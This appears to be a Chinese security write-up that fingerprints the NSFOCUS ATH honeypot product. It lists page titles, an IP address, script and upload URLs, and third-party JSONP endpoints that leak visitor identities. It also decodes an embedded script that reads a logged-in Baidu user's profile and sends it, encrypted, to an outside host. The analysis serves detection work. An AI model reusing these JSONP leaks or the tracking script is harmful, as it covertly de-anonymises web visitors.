绿盟科技蜜罐产品应该是[绿盟高级威胁狩猎系统](https://www.nsfocus.com.cn/html/2021/197_0329/143.html "绿盟高级威胁狩猎系统")（NSFOCUS Advanced Threat Hunting System，简称“ATH”）

产品概述：
```
绿盟高级威胁狩猎系统（NSFOCUS Advanced Threat Hunting System，简称“ATH”）采用欺骗防御技术（下一代蜜罐技术），精准诱捕攻击行为，提供攻击者入侵活动线索，是一款以欺骗防御、威胁情报、AI分析、主动识别技术为核心，结合云端运营、威胁狩猎，对客户网络中潜在威胁进行检测和发现的攻防对抗的实战化产品。在攻防演练活动中，多次斩获攻击者信息，全方面刻画攻击者画像，协助客户成功溯源。
```

蜜罐模板页面标题特征：
```
GPON Home Gateway
BIG-IP®- Redirect
CMS Web Viewer
新版SSLVPN客户端配置说明
```
源代码中很明显的一个注释ip特征（属于噪音）：
```
172.104.73.17
```
jsonp特征：
```
https://data.sloss.xyz/cloud.js?access=5oCd5peg6YKq
https://data.sloss.xyz/jquery.js
https://data.sloss.xyz/get_code.js

https://101.42.156.72/5Ly85piv5pWF5Lq65p2l
https://101.42.156.72/static/login-obfuscated.js
https://101.42.156.72/static/md5.min.js
https://101.42.156.72/static/crypto.js
https://101.42.156.72/static/js-joda.min.js
```
jsonp数据上传特征：
```
POST https://upload.sloss.xyz/5piv6ZmM5LiK5Lq6
POST https://upload.sloss.xyz/5piv6Iqx6Ze06Iie
```
源代码加载js特征：
```
<script src="https://data.sloss.xyz/cloud.js?access=5oCd5peg6YKq"></script>
<script src="https://data.sloss.xyz/get_code.js?access=nsfocus&amp;module=z&amp;browser=/bt&amp;other=/other&amp;tag=openvpn&amp;remark=[]"></script>
```
jsonp接口：
```
http://burp/favicon.ico

https://www.cmpassport.com/h5/onekeylogin/getNewUnicomPhonescrip

https://www.cmpassport.com/h5/onekeylogin/getNewTelecomPhonescrip

https://verify.cmpassport.com/h5/httpsPreGetmobile

https://id6.me/auth/preauth.do?paramKey=10F72757C5A5A12B0A6DA61E62BDF3238163CC31B9CC3CC506CCD6BF67D3BC8CEEC92DAF1ED125BC4F681D118A2ED62D8CD18EE0629220BD69802469FAB4E1C62067CA310EDC5E1A2DCDCF0E8202AA852D611A0B78364344F15A866395C9AAF3C1061C9F6B1ACDCAB232960AC6F14D615ED5184184BDB125AC647A8422EC25D7&clientType=2&paramStr=39826A2D6BADA0327947D80463C1422C01D472F90ECC1B7FC72D262D1C7AC4FC201506C46971655C6C67C5714F232A532126204E40DD35C24C4264AC5D106D9EBEFEBB98157CB7230F5F8BF1788608CA3CF9F38998815804A4652BF20C1EB763525257296155BAF2B4B46836ED276DE6944344B4135D94555640885B4363C4AD&appId=8013416909&format=jsonp&sign=C733AA0C9B2F41175F94344CAF0AA227C2F2B199&version=1.5&

https://opencloud.wostore.cn/openapi/netauth/precheck/wp?timeStamp=1659325750804&packname=xxx&business_type=1&format=jsonp&sign=FCE6F4692C5FEDD8993FDEBD079EBF49&callback=getNewUnicomPhone&fp=&client_type=7&version=v4.5&client_id=99166000000000000228&key=c4ZMLe9%2F1iX9Do2h4FGMqy5vC0IzZ%2Fgj9LePAFU%2BwTSc%2BHUbB6W1arA9YDRqR7HjFok226YHwwJrLq06Da%2BBMBM%2FPV7%2FexfV3uV%2BbR0xzMz4Xy%2F1pKyIriuaXA%2BieaQeYtvjXs1gTYXWc%2F8vZb3TODk9cKywn9FOI7m3iqrJUko%3D&packsign=xxx&

https://openfpcdn.io/fingerprintjs/v3

https://www.taobao.com/help/getip.php?callback=ipCallback

https://tieba.baidu.com/tbmall/gettdouiconinfo?callback=jsonp1613919078534

https://www.qidian.com/ajax/UserInfoFemale/GetUserInfo?areaid=6&appid=10&format=jsonp&method=autoLoginHandler&autoLoginHandler=&_=1607051376245&callback=autoLoginHandler

https://www.yy.com/yyweb/user/queryUserInfo.json?callback=jsonp

https://www.qidian.com/ajax/UserInfoFemale/GetUserInfo?areaid=6&appid=10&format=jsonp&method=autoLoginHandler&autoLoginHandler=&_=1607051376245&callback=autoLoginHandler

https://v2.sohu.com/api/pc-home-city/home-data/ip2location?_=1606458878259&callback=jQuery1124018281896477578718_1606458878259

https://widget.weibo.com/public/aj_relationship.php?fuid=2991975565&callback=STK_16073033003861

https://yuedu.baidu.com/nauser/getyduserinfo?na_uncheck=1&opid=wk_na&callback=bd
```
cloud.js?access=5oCd5peg6YKq最后有段Base64加密：
```
PGhlYWQ+CiAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9jcnlwdG8tanNANC4xLjEvY3J5cHRvLWpzLmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL29iamVjdC1oYXNoQDIuMi4wL2Rpc3Qvb2JqZWN0X2hhc2guanMiPjwvc2NyaXB0Pgo8L2hlYWQ+CjxzY3JpcHQ+CgogICAgZnVuY3Rpb24gYmQoYikgewogICAgICAgIGZ1bmN0aW9uIGdldF9kYXRhKGRhdGEpIHsKICAgICAgICAgICAgdmFyIG15ZGF0ZSA9IG5ldyBEYXRlKCk7CiAgICAgICAgICAgIGxldCBtb250aCA9IG15ZGF0ZS5nZXRNb250aCgpICsgMTsKICAgICAgICAgICAgbGV0IGRheSA9IG15ZGF0ZS5nZXREYXRlKCk7CiAgICAgICAgICAgIG1vbnRoID0gbW9udGggPiA5ID8gbW9udGggOiAiMCIgKyBtb250aDsKICAgICAgICAgICAgZGF5ID0gZGF5ID4gOSA/IGRheSA6ICIwIiArIGRheTsKICAgICAgICAgICAgdmFyIG15a2V5ID0gIm5zZm9jdXNfZnlzZWNfIiArIG15ZGF0ZS5nZXRGdWxsWWVhcigpLnRvU3RyaW5nKCkgKyAiXyIgKyBtb250aCArICJfIiArIGRheTsKICAgICAgICAgICAgdmFyIG15a2V5ID0gQ3J5cHRvSlMuTUQ1KG15a2V5KTsKICAgICAgICAgICAgY29uc3Qga2V5ID0gQ3J5cHRvSlMuZW5jLlV0ZjgucGFyc2UobXlrZXkpOwogICAgICAgICAgICBjb25zdCBpdiA9IENyeXB0b0pTLmVuYy5VdGY4LnBhcnNlKCdBQkNERUYxMjM0MTIzNDEyJyk7ICAgLy/ljYHlha3kvY3ljYHlha3ov5vliLbmlbDkvZzkuLrlr4bpkqXlgY/np7vph48KICAgICAgICAgICAgZnVuY3Rpb24gRW5jcnlwdCh3b3JkKSB7CiAgICAgICAgICAgICAgICBsZXQgc3JjcyA9IENyeXB0b0pTLmVuYy5VdGY4LnBhcnNlKHdvcmQpOwogICAgICAgICAgICAgICAgbGV0IGVuY3J5cHRlZCA9IENyeXB0b0pTLkFFUy5lbmNyeXB0KHNyY3MsIGtleSwgewogICAgICAgICAgICAgICAgICAgIGl2OiBpdiwKICAgICAgICAgICAgICAgICAgICBtb2RlOiBDcnlwdG9KUy5tb2RlLkNCQywKICAgICAgICAgICAgICAgICAgICBwYWRkaW5nOiBDcnlwdG9KUy5wYWQuUGtjczcKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgcmV0dXJuIGVuY3J5cHRlZC5jaXBoZXJ0ZXh0LnRvU3RyaW5nKENyeXB0b0pTLmVuYy5CYXNlNjQpOwogICAgICAgICAgICB9CgogICAgICAgICAgICByZXR1cm4gRW5jcnlwdChkYXRhKTsKICAgICAgICB9CgogICAgICAgIGlmIChiLmlzTG9naW4gPT09IHRydWUpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICAgICAgICAgInVzZXJuYW1lIjogYi51bmFtZSwKICAgICAgICAgICAgICAgICAgICAicG9ydHJhaXQiOiBiLmhlYWRpY29uLAogICAgICAgICAgICAgICAgICAgICJpc192aXAiOiBiLmlzX3ZpcCwKICAgICAgICAgICAgICAgICAgICAidXNlcl9mbGFnIjogYi51c2VyZmxhZwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZmV0Y2goImh0dHBzOi8vdXBsb2FkLnNsb3NzLnh5ei81cGl2NklxeDZaZTA2SWllIiwgewogICAgICAgICAgICAgICAgICAgIG1ldGhvZDogIlBPU1QiLAogICAgICAgICAgICAgICAgICAgIGNhY2hlOiAibm8tY2FjaGUiLAogICAgICAgICAgICAgICAgICAgIGJvZHk6IGdldF9kYXRhKEpTT04uc3RyaW5naWZ5KGV2YWwoJygnICsgSlNPTi5zdHJpbmdpZnkoZGF0YSkgKyAnKScpKSkKICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIGxldCBzID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CiAgICBzLnNyYyA9ICJodHRwczovL3l1ZWR1LmJhaWR1LmNvbS9uYXVzZXIvZ2V0eWR1c2VyaW5mbz9uYV91bmNoZWNrPTEmb3BpZD13a19uYSZjYWxsYmFjaz1iZCI7CiAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuYXBwZW5kQ2hpbGQocyk7CiAgICBzLm9ubG9hZCA9IGZ1bmN0aW9uICgpIHsKICAgICAgICBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7CgogICAgICAgIH0sIDIwMDApCiAgICB9Cgo8L3NjcmlwdD4KCg==
```
Base64解密：
```
<head>
    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/object-hash@2.2.0/dist/object_hash.js"></script>
</head>
<script>

    function bd(b) {
        function get_data(data) {
            var mydate = new Date();
            let month = mydate.getMonth() + 1;
            let day = mydate.getDate();
            month = month > 9 ? month : "0" + month;
            day = day > 9 ? day : "0" + day;
            var mykey = "nsfocus_fysec_" + mydate.getFullYear().toString() + "_" + month + "_" + day;
            var mykey = CryptoJS.MD5(mykey);
            const key = CryptoJS.enc.Utf8.parse(mykey);
            const iv = CryptoJS.enc.Utf8.parse('ABCDEF1234123412');   //十六位十六进制数作为密钥偏移量
            function Encrypt(word) {
                let srcs = CryptoJS.enc.Utf8.parse(word);
                let encrypted = CryptoJS.AES.encrypt(srcs, key, {
                    iv: iv,
                    mode: CryptoJS.mode.CBC,
                    padding: CryptoJS.pad.Pkcs7
                });
                return encrypted.ciphertext.toString(CryptoJS.enc.Base64);
            }

            return Encrypt(data);
        }

        if (b.isLogin === true) {
            try {
                data = {
                    "username": b.uname,
                    "portrait": b.headicon,
                    "is_vip": b.is_vip,
                    "user_flag": b.userflag
                }
                fetch("https://upload.sloss.xyz/5piv6Iqx6Ze06Iie", {
                    method: "POST",
                    cache: "no-cache",
                    body: get_data(JSON.stringify(eval('(' + JSON.stringify(data) + ')')))
                });

            } catch (e) {
            }
        }
    }

    let s = document.createElement("script");
    s.src = "https://yuedu.baidu.com/nauser/getyduserinfo?na_uncheck=1&opid=wk_na&callback=bd";
    document.documentElement.appendChild(s);
    s.onload = function () {
        setInterval(function () {

        }, 2000)
    }

</script>
```
